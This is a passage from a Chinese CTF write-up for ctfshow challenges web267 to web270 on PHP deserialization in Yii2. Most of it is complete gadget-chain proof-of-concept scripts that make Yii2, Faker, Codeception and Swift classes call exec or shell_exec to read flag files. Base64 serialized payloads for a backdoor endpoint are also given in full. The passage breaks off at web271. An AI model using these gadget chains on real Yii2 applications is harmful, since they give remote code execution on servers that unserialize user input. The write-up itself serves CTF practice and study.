脚本使用了base64_encode函数对序列化后的字符串进行编码，并输出到命令行\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess='exec';\n            $this->id='cat /flag >3.txt';\n        }\n    }\n}\nnamespace Faker{\n    use yii\\rest\\IndexAction;\n    class Generator{\n        protected $formatters;\n        public function __construct(){\n            $this->formatters['close']=[new IndexAction(),'run'];\n        }\n    }\n}\nnamespace yii\\db{\n    use Faker\\Generator;\n    class BatchQueryResult{\n        private $_dataReader;\n        public function __construct(){\n            $this->_dataReader=new Generator();\n        }\n    }\n}\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n?>\n\n```\n\n主要就是改checkAccess参数以及id参数,使之可以回显\n\n直接cat flag的话会出现An internal server error occurred.\n\n应该是设置了非调试模式的生产环境运行方式\n\n传参GET:\n?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo0OiJleGVjIjtzOjI6ImlkIjtzOjE2OiJjYXQgL2ZsYWcgPjMudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19\n访问\nhttp://08a2bbcd-9f38-4806-bf8d-902d04e4a1fc.challenge.ctf.show/3.txt\n\n## web268\n\npoc：\n\n```php\n<?php\n\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess = 'exec';\n            $this->id = 'cp /f* 1.txt';\n        }\n    }\n}\nnamespace Faker {\n\n    use yii\\rest\\IndexAction;\n\n    class Generator\n    {\n        protected $formatters;\n\n        public function __construct()\n        {\n            $this->formatters['isRunning'] = [new IndexAction(), 'run'];\n        }\n    }\n}\nnamespace Codeception\\Extension{\n\n    use Faker\\Generator;\n\n    class RunProcess\n    {\n        private $processes = [];\n        public function __construct(){\n            $this->processes[]=new Generator();\n        }\n    }\n}\nnamespace{\n\n\n    use Codeception\\Extension\\RunProcess;\n\n    echo base64_encode(serialize(new RunProcess()));\n}\n\n```\n\n**?r=backdoor/shell&code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTI6ImNwIC9mKiAxLnR4dCI7fWk6MTtzOjM6InJ1biI7fX19fX0=**\n\n然后访问1.txt就行\n\n## web269\n\n```php\n<?php \nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess='shell_exec';\n            $this->id='cat /flagsa | tee 2.txt';\n            //$this->id='ls / | tee 1.txt';\n        }\n    }\n}\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n    class Generator{\n        protected $formatters;\n        public function __construct(){\n            $this->formatters['render']=[new CreateAction(),'run'];\n        }\n    }\n}\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n    use Faker\\Generator;\n    class See{\n        protected $description;\n        public function __construct(){\n            $this->description=new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys=[];\n        private $path;\n        public function __construct(){\n            $this->path=new See;\n            $this->keys=array(\n                \"axin\"=>array(\"is\"=>\"handsome\")\n            );\n        }\n    }\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n?>\n\n```\n\n?r=backdoor/shell&code=TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6MTA6InNoZWxsX2V4ZWMiO3M6MjoiaWQiO3M6MjM6ImNhdCAvZmxhZ3NhIHwgdGVlIDIudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19fQ==\n\n正常传入然后访问1.txt就可以了\n\n## web270\n\n```php\n<?php\nnamespace yii\\rest{\n    class IndexAction{\n        public $checkAccess;\n        public $id;\n        public function __construct(){\n            $this->checkAccess='shell_exec';\n            $this->id='cat /flagsaa | tee 2.txt';\n            //$this->id='ls / | tee 1.txt';\n        }\n    }\n}\nnamespace yii\\web{\n    use yii\\rest\\IndexAction;\n    class DbSession{\n        public $writeCallback;\n        public function __construct(){\n            $this->writeCallback=[new IndexAction(),'run'];\n        }\n    }\n}\nnamespace yii\\db{\n    use yii\\web\\DbSession;\n    class BatchQueryResult{\n        private $_dataReader;\n        public function __construct(){\n            $this->_dataReader=new DbSession();\n        }\n    }\n}\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n?>\n\n```\n\n## web271\n\n","tags":["PHP反序列化"],"categories":["ctfshow"]}]